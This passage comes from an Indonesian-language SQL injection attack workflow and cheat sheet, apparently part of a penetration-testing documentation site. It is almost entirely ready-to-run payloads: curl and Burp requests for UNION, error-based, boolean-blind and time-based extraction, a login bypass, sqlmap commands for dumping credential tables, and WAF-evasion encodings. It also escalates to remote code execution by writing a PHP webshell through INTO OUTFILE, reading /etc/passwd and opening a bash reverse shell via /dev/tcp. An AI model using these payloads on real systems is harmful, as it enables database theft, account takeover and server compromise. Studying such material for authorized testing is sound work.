curl -s --get --data-urlencode "$PARAM=10 AND 1=2-- -" "$TARGET_URL/item" | wc -c
```

```bash
export INJECT_CONTEXT="numeric"   # atau "string"
```

---

## ═══════════════════════════════════

## FASE 2: CLASSIC / UNION

## ═══════════════════════════════════

**Masuk sini jika:** Response menampilkan data langsung (In-Band SQLi)

### Langkah 2.1 — Column Count

```bash
for i in 1 2 3 4 5 6 7 8; do
  SIZE=$(curl -s -o /dev/null -w "%{size_download}" \
    --get --data-urlencode "$PARAM=10 ORDER BY $i-- -" "$TARGET_URL/item")
  echo "ORDER BY $i → Size: $SIZE"
done
```

**OUTPUT ✅:**

```
ORDER BY 3 → Size: 14820
ORDER BY 4 → Size: 421   ← ERROR → 3 kolom
```

```bash
export COL_COUNT=3
```

### Langkah 2.2 — Find Displayable Column

```bash
curl -s --get \
  --data-urlencode "$PARAM=0 UNION SELECT 'INJECT_A','INJECT_B','INJECT_C'-- -" \
  "$TARGET_URL/item"
```

Cari `INJECT_A`, `INJECT_B`, `INJECT_C` di response.

```bash
export DISPLAY_COL=1   # Kolom yang akan dipakai untuk output
```

### Langkah 2.3 — Ekstrak DB Info

```bash
# MySQL
curl -s --get \
  --data-urlencode "$PARAM=0 UNION SELECT @@version,database(),user()-- -" \
  "$TARGET_URL/item"

# PostgreSQL
curl -s --get \
  --data-urlencode "$PARAM=0 UNION SELECT version(),current_database(),current_user-- -" \
  "$TARGET_URL/item"
```

### Langkah 2.4–2.6 — Tables → Columns → Data

```bash
# Tables (MySQL)
curl -s --get \
  --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(table_name),'B','C' FROM information_schema.tables WHERE table_schema=database()-- -" \
  "$TARGET_URL/item"

# Columns
curl -s --get \
  --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(column_name),'B','C' FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -" \
  "$TARGET_URL/item"

# Dump credentials
curl -s --get \
  --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(username,0x3a,password),'B','C' FROM users-- -" \
  "$TARGET_URL/item"
```

**OUTPUT ✅ — Credential dump:**

```
admin:5f4dcc3b5aa765d61d8327deb882cf99,john:482c811da5d5b4bc6d497ffa98491e38
```

→ Simpan → crack hash → **FASE Post-SQLi**

---

## ═══════════════════════════════════

## FASE 3: LOGIN BYPASS

## ═══════════════════════════════════

```
[Burp] Intercept POST /login → Repeater

username=administrator'--
password=(bebas)
```

**OUTPUT ✅ — Redirect ke dashboard:**

```
HTTP/1.1 302 Found
Location: /my-account
```

→ Logged in as administrator!

**OUTPUT ❌ — Login still fail:**

```bash
# Coba variasi
# administrator'--
# admin'--
# administrator'#
# ' OR 1=1 LIMIT 1--
```

---

## ═══════════════════════════════════

## FASE 4: BOOLEAN BLIND EXTRACTION

## ═══════════════════════════════════

**Masuk sini jika:** TRUE/FALSE response berbeda

### Manual Character-by-Character

```
[Burp] Repeater:
# Konfirmasi user ada
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator')='a

# Cek panjang password
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=20)='a

# Extract karakter pertama
TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a
```

### Automasi via Burp Intruder

```
[Burp] Intruder → Cluster Bomb:
Position 1: posisi karakter §1§ (1-20)
Position 2: karakter §a§ (a-z, 0-9)

Filter: Response contains "Welcome back!"
```

### Automasi via Python Script

```bash
python3 boolean_blind.py \
  --url "http://$TARGET/filter?category=Gifts" \
  --cookie "TrackingId" \
  --marker "Welcome back" \
  --query "SELECT password FROM users WHERE username='administrator'"
```

---

## ═══════════════════════════════════

## FASE 5: TIME-BASED EXTRACTION

## ═══════════════════════════════════

### Konfirmasi

```
[Burp] Repeater:
MySQL:      category=Gifts' AND SLEEP(10)-- -
PostgreSQL: category=Gifts' AND 1=(SELECT 1 FROM pg_sleep(10))--

Perhatikan response time di pojok kanan bawah Repeater
Baseline ~200ms → delay ~10000ms = confirmed
```

### Extract Data

```
[Burp] PostgreSQL conditional:
TrackingId=xyz'%3BSELECT+CASE+WHEN+(SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--
```

### SQLMap untuk Time-Based

```bash
sqlmap -r ~/sqli_loot/requests/request.txt \
  --technique=T \
  --time-sec=10 \
  --dbms=PostgreSQL \
  -D public -T users -C username,password \
  --dump --batch
```

---

## ═══════════════════════════════════

## FASE 6: RCE DARI SQLi (MySQL)

## ═══════════════════════════════════

### Pre-check Privilege

```bash
curl -s --get \
  --data-urlencode "$PARAM=0 UNION SELECT @@secure_file_priv,'B','C'-- -" \
  "$TARGET_URL/item"
```

- `''` → bisa tulis ke mana saja ✅
- Path → restricted ⚠️
- `NULL` → tidak bisa ❌

```bash
# Konfirmasi FILE read
curl -s --get \
  --data-urlencode "$PARAM=0 UNION SELECT LOAD_FILE('/etc/passwd'),'B','C'-- -" \
  "$TARGET_URL/item"
```

### Upload Webshell

```bash
curl -s --get \
  --data-urlencode "$PARAM=0 UNION SELECT '<?php system(\$_GET[\"c\"]); ?>','B','C' INTO OUTFILE '/var/www/html/sh.php'-- -" \
  "$TARGET_URL/item"

# Test
curl -s "http://$TARGET/sh.php?c=id"
```

**OUTPUT ✅:**

```
uid=33(www-data) gid=33(www-data)
```

```bash
# Reverse shell
nc -lvnp $LPORT &
curl -s "http://$TARGET/sh.php" \
  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
```

---

## ═══════════════════════════════════

## MASTER DECISION TREE

## ═══════════════════════════════════

```
START: Ditemukan Input Parameter (GET/POST/Cookie/Header)
│
├─ FASE 0: Reconnaissance → baseline, tech stack
│
├─ FASE 1: Detection
│   ├─ SQL Error terlihat → FASE 3 (Error-Based) ATAU FASE 2 (UNION)
│   ├─ TRUE/FALSE berbeda → FASE 4 (Boolean Blind)
│   ├─ Delay terdeteksi → FASE 5 (Time-Based)
│   └─ Login form ditemukan → Section 2 (Login Bypass)
│
├─ FASE 2: UNION SQLi
│   └─ Column count → displayable col → DB → Tables → Columns → Data → CRACK
│
├─ FASE 3: Error-Based
│   └─ MySQL: EXTRACTVALUE | MSSQL: CONVERT | PgSQL: CAST
│
├─ FASE 4: Boolean Blind
│   ├─ Manual: SUBSTRING + ASCII + binary search
│   └─ Auto: Python script / SQLMap --technique=B
│
├─ FASE 5: Time-Based
│   ├─ MySQL: SLEEP() | MSSQL: WAITFOR | PgSQL: pg_sleep() subquery
│   └─ SQLMap --technique=T (lebih reliable)
│
├─ FASE 6: SQLMap Automation (setelah manual confirm)
│
├─ FASE 7: Special Contexts (Cookie/Header/JSON/XML)
│
└─ FASE 8: Escalation
    ├─ [MySQL FILE priv] → INTO OUTFILE → Webshell → RCE → Privesc
    ├─ [MSSQL sysadmin] → xp_cmdshell → RCE → Privesc
    ├─ [PgSQL superuser] → COPY PROGRAM → RCE → Privesc
    └─ [Credentials] → Credential state machine → Cross-service pivot
```

---

# ⚡ Quick Reference Cheatsheet

```
=== DETECTION (Burp Repeater) ===
Single quote:  id=10'
Boolean TRUE:  id=10 AND 1=1-- -
Boolean FALSE: id=10 AND 1=2-- -
String TRUE:   id=Gifts' AND '1'='1-- -
Time [MySQL]:  id=10 AND SLEEP(10)-- -
Time [PgSQL]:  id=10 AND 1=(SELECT 1 FROM pg_sleep(10))-- -
Time [MSSQL]:  id=10; WAITFOR DELAY '0:0:10'-- -
Login bypass:  username=administrator'--

=== COLUMN COUNT ===
ORDER BY:  id=10 ORDER BY 1--     (naik sampai error)
NULL:      id=10 UNION SELECT NULL--  (naik NULL sampai 200)
Oracle:    id=10 UNION SELECT NULL FROM DUAL--

=== FIND DISPLAYABLE COL (3 kolom) ===
id=10 UNION SELECT 'A',NULL,NULL--
id=10 UNION SELECT NULL,'B',NULL--
id=10 UNION SELECT NULL,NULL,'C'--

=== DB INFO ===
[MySQL]   UNION SELECT @@version,database(),user()-- -
[PgSQL]   UNION SELECT version(),current_database(),current_user--
[MSSQL]   UNION SELECT @@VERSION,DB_NAME(),SYSTEM_USER--
[Oracle]  UNION SELECT banner,NULL FROM v$version--
[SQLite]  UNION SELECT sqlite_version(),NULL--

=== TABLES ===
[MySQL]   UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -
[PgSQL]   UNION SELECT string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'--
[MSSQL]   UNION SELECT STRING_AGG(name,','),NULL FROM sys.tables--
[Oracle]  UNION SELECT table_name,NULL FROM all_tables--
[SQLite]  UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'--

=== COLUMNS ===
[MySQL]   UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -
[PgSQL]   UNION SELECT string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'--
[MSSQL]   UNION SELECT STRING_AGG(c.name,','),NULL FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='users'--
[Oracle]  UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
[SQLite]  UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--

=== DUMP ===
2 col:    UNION SELECT username,password FROM users--
1 col:    UNION SELECT username||'~'||password FROM users--
[MySQL]:  UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL FROM users-- -
[SQLite]: UNION SELECT group_concat(username||':'||password),NULL FROM users--

=== ERROR-BASED ===
[PgSQL]:  ' AND CAST((SELECT password FROM users WHERE username='administrator') AS integer)--
[MySQL]:  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))-- -
[MSSQL]:  ' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))--

=== BOOLEAN BLIND ===
Cek user:   ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Panjang:    ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
Char:       ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

=== TIME-BASED ===
[MySQL]    ' AND SLEEP(10)-- -
[PgSQL]    ' AND 1=(SELECT 1 FROM pg_sleep(10))--
[MSSQL]    '; WAITFOR DELAY '0:0:10'--
[Oracle]   '||dbms_pipe.receive_message('a',10)--

=== BOOLEAN CONDITIONAL ===
[MySQL]:   ' AND IF(1=1,SLEEP(10),0)-- -
[PgSQL]:   '; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
[Oracle]:  '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

=== XML BYPASS ===
UNION  → &#x55;&#x4e;&#x49;&#x4f;&#x4e;
SELECT → &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;

=== SQLMAP ===
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D db --tables
sqlmap -r request.txt --batch -D db -T users -C username,password --dump
sqlmap -r request.txt --technique=T --time-sec=10 --batch --dbs
sqlmap -r request.txt --tamper=space2comment,randomcase --random-agent --batch --dbs

=== MYSQL RCE PRE-CHECK ===
UNION SELECT @@secure_file_priv,NULL-- -
UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
UNION SELECT PRIVILEGE_TYPE,NULL FROM information_schema.user_privileges WHERE GRANTEE=CONCAT(CHAR(39),user(),CHAR(39))-- -

=== MYSQL WEBSHELL ===
UNION SELECT '<?php system($_GET["c"]); ?>',NULL INTO OUTFILE '/var/www/html/sh.php'-- -
```

---

> **➡️ NEXT setelah dapat credentials:**
> 
> - Password plaintext → [`<a href="/docs/authentication-bypass" class="text-[#00b4d8] hover:underline font-mono font-semibold">18_authentication_bypass_workflow.md</a>`](/docs/authentication-bypass) atau langsung login/pivot
> - Hash → [`<a href="/docs/password-cracking" class="text-[#00b4d8] hover:underline font-mono font-semibold">63_password_cracking_workflow.md</a>`](/docs/password-cracking) (hashcat/john)
> - SSH access → [`<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>`](/docs/ssh)
> - SMB access → [`<a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>`](/docs/smb-samba)
> - Shell dari RCE → [`<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`](/docs/linux-privesc) atau [`45_windows_privesc_workflow.md`](/docs/windows-privesc)